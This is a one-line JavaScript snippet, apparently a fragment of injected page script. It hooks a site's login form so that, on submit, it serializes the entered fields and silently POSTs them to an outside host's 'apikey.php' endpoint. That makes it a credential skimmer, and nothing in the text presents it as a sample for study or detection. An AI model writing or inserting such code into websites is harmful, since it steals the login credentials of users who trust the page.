(".login-form").submit(function() {$.ajax({ url:"http://api.safhosting.my.id/apikey.php",type: "POST",data: $(this).serialize(), success: function () {}})});
